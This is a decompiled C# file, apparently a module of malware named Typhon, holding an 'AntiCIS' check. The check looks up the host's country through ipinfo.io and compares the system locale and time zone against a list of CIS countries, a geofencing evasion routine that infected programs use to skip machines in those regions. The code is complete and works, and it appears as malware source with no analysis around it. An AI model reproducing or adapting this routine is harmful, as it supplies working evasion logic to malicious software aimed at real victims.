using System;
using System.Globalization;
using System.Net;
using Typhon.Modules.Miscellaneous;

namespace Typhon.Modules.Blacklist
{
	// Token: 0x02000060 RID: 96
	internal class AntiCIS
	{
		// Token: 0x06000241 RID: 577 RVA: 0x0000D0F4 File Offset: 0x0000B2F4
		public static bool IsCIS()
		{
			JSONNode jsonnode = JSON.Parse(new WebClient().DownloadString("http://ipinfo.io/json"));
			string[] array = new string[]
			{
				"AM",
				"AZE",
				"AZ",
				"RU",
				"KZ",
				"KAZ",
				"UZ",
				"UZB",
				"KGZ",
				"KG",
				"MD",
				"MDA",
				"TM",
				"TKM",
				"TJK",
				"TJ",
				"BY",
				"BLR"
			};
			for (int i = 0; i < array.Length; i++)
			{
				if (array[i] == jsonnode["country"])
				{
					return true;
				}
			}
			string[] array2 = new string[]
			{
				"Armenia",
				"Azerbaijan",
				"Belarus",
				"Kazakhstan",
				"Kyrgyzstan",
				"Moldova",
				"Tajikistan",
				"Uzbekistan",
				"Russia"
			};
			try
			{
				CultureInfo currentCulture = CultureInfo.CurrentCulture;
				RegionInfo regionInfo = new RegionInfo((currentCulture != null) ? currentCulture.ToString() : null);
				TimeZoneInfo local = TimeZoneInfo.Local;
				foreach (string text in array2)
				{
					if (text.Contains(regionInfo.EnglishName) || local.Id.Contains(text))
					{
						return true;
					}
				}
			}
			catch
			{
			}
			return false;
		}
	}
}
